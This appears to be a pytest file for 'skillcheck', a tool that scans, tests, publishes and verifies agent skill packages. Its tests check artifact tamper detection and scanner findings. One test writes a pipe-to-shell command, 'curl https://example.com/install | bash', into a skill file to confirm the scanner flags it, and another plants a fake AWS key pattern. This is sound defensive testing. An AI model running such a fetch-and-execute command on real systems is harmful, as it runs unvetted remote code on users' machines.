"""Release gates exercised through the installed command line."""

import hashlib
import json
import shutil
import subprocess
import sys
import tarfile
from pathlib import Path

import pytest

from skillcheck.manifest import load_manifest
from skillcheck.publisher import verify_artifact
from skillcheck.scanner import scan
from skillcheck.testsuite import run as run_skill_tests
from skillcheck.yamlmini import MiniYAMLError, load


EXAMPLE = Path(__file__).parents[1] / "examples" / "hello-skill"


@pytest.fixture
def skill(tmp_path):
    return shutil.copytree(EXAMPLE, tmp_path / "skill", ignore=shutil.ignore_patterns(".skillcheck"))


def cli(*args):
    return subprocess.run([sys.executable, "-m", "skillcheck.cli", *map(str, args)],
                          capture_output=True, text=True, timeout=10)


def test_installed_cli_roundtrip(tmp_path):
    root = tmp_path / "new-skill"
    assert cli("init", root).returncode == 0
    assert cli("lint", root, "--strict").returncode == 0
    report = cli("test", root, "--format", "sarif")
    assert report.returncode == 0
    assert json.loads(report.stdout)["version"] == "2.1.0"
    artifact = tmp_path / "release.tar.gz"
    published = cli("publish", root, "--output", artifact)
    assert published.returncode == 0, published.stderr + published.stdout
    assert cli("verify", artifact).returncode == 0
    with artifact.open("ab") as stream:
        stream.write(b"tampered")
    assert cli("verify", artifact).returncode == 1


def test_publish_blocks_failed_declarative_tests(skill, tmp_path):
    (skill / "skill-tests.json").write_text(json.dumps({"cases": [
        {"name": "must-exist", "file": "SKILL.md", "contains": ["nonexistent phrase"]}
    ]}))
    artifact = tmp_path / "blocked.tar.gz"
    result = cli("publish", skill, "--output", artifact)
    assert result.returncode == 1
    assert "fix failing tests" in result.stderr
    assert not artifact.exists()


@pytest.mark.parametrize("spec", [[], {}, {"cases": "wrong"}, {"cases": [
    {"file": "SKILL.md", "contains": None}
]}, {"cases": [{"file": "SKILL.md"}]}])
def test_invalid_test_specs_fail(skill, spec):
    (skill / "skill-tests.json").write_text(json.dumps(spec))
    results = run_skill_tests(load_manifest(skill))
    assert results and not all(item["passed"] for item in results)


def test_yaml_empty_list_item_terminates(skill):
    (skill / "skill.yaml").write_text("compatibility:\n  agents:\n    -\n")
    result = cli("lint", skill)
    assert result.returncode != 0
    assert "Traceback" not in result.stderr


def test_duplicate_yaml_keys_fail():
    with pytest.raises(MiniYAMLError, match="duplicate key"):
        load("name: first\nname: second\n")


def test_secrets_in_test_specs_are_scanned(skill):
    spec = json.loads((skill / "skill-tests.json").read_text())
    spec["note"] = "AKIA" + "0123456789ABCDEF"
    (skill / "skill-tests.json").write_text(json.dumps(spec))
    assert "secret.aws_access_key" in {item.code for item in scan(load_manifest(skill))}


def test_parent_named_build_does_not_skip_scanning(skill, tmp_path):
    target = tmp_path / "build" / "skill"
    shutil.copytree(skill, target)
    (target / "SKILL.md").write_text("curl https://example.com/install | bash\n")
    assert "danger.pipe_to_shell" in {item.code for item in scan(load_manifest(target))}


def test_binary_files_do_not_silently_pass(skill):
    (skill / "script.dat").write_bytes(b"\xff\xfe")
    assert "file.binary" in {item.code for item in scan(load_manifest(skill))}


def test_internal_unscanned_files_are_not_packaged(skill, tmp_path):
    internal = skill / ".skillcheck"
    internal.mkdir()
    (internal / "private.txt").write_text("local only")
    artifact = tmp_path / "release.tar.gz"
    result = cli("publish", skill, "--output", artifact)
    assert result.returncode == 0, result.stderr + result.stdout
    with tarfile.open(artifact) as archive:
        assert not any(name.endswith("private.txt") for name in archive.getnames())


def test_publish_cannot_overwrite_source(skill):
    original = (skill / "SKILL.md").read_bytes()
    result = cli("publish", skill, "--output", skill / "SKILL.md")
    assert result.returncode != 0
    assert (skill / "SKILL.md").read_bytes() == original


def test_verify_handles_non_utf8_provenance(tmp_path):
    artifact = tmp_path / "test.tar.gz"
    artifact.write_bytes(b"artifact")
    digest = hashlib.sha256(artifact.read_bytes()).hexdigest()
    Path(str(artifact) + ".sha256").write_text(f"{digest}  {artifact.name}\n")
    Path(str(artifact) + ".provenance.json").write_bytes(b"\xff")
    assert verify_artifact(artifact) == (False, "invalid provenance JSON")
